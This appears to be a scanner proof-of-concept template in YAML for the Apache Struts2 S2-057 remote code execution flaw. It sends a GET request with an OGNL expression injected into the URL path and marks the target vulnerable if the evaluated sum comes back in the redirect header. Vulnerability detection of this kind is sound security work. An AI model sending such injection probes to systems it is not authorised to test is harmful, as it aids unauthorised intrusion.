name: poc-yaml-s2-057-rce
rules:
  - method: GET
    path: /${(111111111+123123123)}/actionChain1.action
    follow_redirects: false
    expression: |
        response.status == 302 && response.headers["location"].contains('234234234')
detail:
  vulnType: S2-057远程执行代码漏洞
  author: supersalted(https://github.com/salted)
  links:
    - http://vulapps.evalbug.com/s_struts2_s2-057/
